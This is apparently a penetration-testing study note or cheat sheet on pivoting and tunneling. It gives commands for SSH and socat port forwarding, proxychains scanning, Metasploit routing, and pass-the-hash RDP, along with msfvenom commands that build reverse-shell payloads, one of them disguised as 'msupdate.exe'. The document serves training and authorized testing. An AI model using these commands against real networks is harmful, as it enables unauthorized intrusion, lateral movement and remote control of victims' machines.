# Pivoting, Tunneling, and Port Forwarding

**Pivoting**

- Circumvent network segmentation to access isolated hosts.

**Tunneling**

- Subcategory of pivoting. Encapsulates network traffic into an alternate protocol and routes traffic through it.

**Lateral Movement**

- Technique used to gain access to other hosts, applications, or services within an organization.

**Port Fowarding**

- Redirect network requests to an alternate port.

- Typically uses TCP for communication.

- SSH, SOCKS, or other protocols can be used to encapsulate (tunnel) forwarded traffic.

## Dynamic Port Forwarding with SSH/SOCKS Tunneling

**SOCKS**

- Socket Secure

- SOCKS4 -> No Authentication/UDP support.

- SOCKS5 -> Supports Authentication/UDP.

**Proxychains**

- Route TCP packets through TOR, SOCKS, and HTTP/HTTPS Proxy Servers.

- Chain multiple proxies together.

- /etc/proxychains.conf

### Examples

**Host Discovery via Ping Sweep**

```sh
# Linux
for x in {1..254}; do (ping -c 1 10.0.0.$x | grep "bytes from" &); done;
```

```cmd
# CMD
for /L %i in (1 1 254) do ping 10.0.0.%i -n 1 -w 100 find "Reply"
```

```ps
# PowerShell
1..254 % {"10.0.0.$($_): $(Test-Connection -count 1 -comp 10.0.0.$($_) -quiet)"}
```

- Run twice to build arp cache and prevent false negatives.

**SSH Local Port Forward**

```sh
ssh -L <localport>:<localhost>:<remoteport> <target>
```

- Access remote service locally
- -L flag can be used multiple times

**SOCKS Tunneling w/ Proxychains (Pivot)**

```sh
# Enable SSH Dynamic Port Forwarding
ssh -D <port-to-route-traffic-through> <target>

# Configure Proxy Chains
echo '<proxy_protocol> <ip> <port>' tee -a 
/etc/proxychains.conf

# Forward Nmap Traffic Through Proxy
# ICMP allowed
proxychains nmap -sn 10.0.0.1-254
# ICMP denied
proxychains nmap -v -Pn -sT

# Metasploit
proxychains msfconsole

# RDP
proxychains xfreerdp /v:<host> /u:<user> /p:<password>
```

- Can only perform full TCP connect scan w/ proxychains.

- Exceptionally slower than non-proxied scans.

## Remote/Reverse Port Forwarding with SSH

```sh
# Start Webserver on Pivot Host
python3 -m http.server <port>

# Download Payload to Target

iwr -uri "http://<pivot_host_ip>/<file>" -outfile <output_filename>

# Start SSH Reverse Port Forward
ssh -R <pivot_host_internal_ip>:<pivot_host_port>:0.0.0.0:<local_port> <target> -v -N
```

- -N -> Disable login prompt

## Meterpreter Tunneling/Port Forwarding

**Add Routes via MSF AutoRoute Module**

```sh
# Create Meterpreter Session on Pivot Host and Configure Proxychains First

# Configure Metasploit's SOCKS Proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run

# Create Routes w/ AutoRoute
help autoroute
use post/multi/manage/autoroute
set SESSION <session_ID>
set SUBNET <network_address>
run

# Create Routes Directly From Meterpreter
run autoroute -s <network_address>/<netmask>

# List Active Routes
run autoroute -p

# Test Routing
proxychains nmap -sT -v -Pn <target_ip> -p <port> 
```

**Meterpreter Port Forwarding /w portfwd Module**

```sh
# Display portfwd Help
help portfwd

# Create Local TCP Relay
portfwd add -l <local_port> -p <remote_port> -r <remote_ip>

# Connect To Remote Service via localhost
xfreerdp /v:localhost /u:<user> /pth:<hash>
```

**Meterpreter Reverse Port Forwarding**

```sh
# Configure Reverse Port Forward Rules
portfwd add -R -l <local_port> -p <pivot_host_port> -L <local_host>

# Background Task
bg

# Configure multi/handler
set payload <payload>
set LPORT <local_port>
set LHOST <local_host>

# Generate Payload
msfvenom -p <payload> LHOST=<pivot_host> LPORT=<pivot_host_port> -f <format> -o <outfile>
```

## Socat Reverse Shell Relay

**Socat**

- Bi-directional relay utility that can create pipe sockets between two independent network channels.

- Does not require SSH tunneling.

**Start Socat Listener On Pivot Host**

```sh
socat TCP4-LISTEN:<pivot_host_port>,fork TCP:<local_host>:<local_port>
```

**Generate Windows Payload**

```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<pivot_host> LPORT=<pivot_port> -f exe -o msupdate.exe
```

## Socat Redirection w/ Bind Shell**

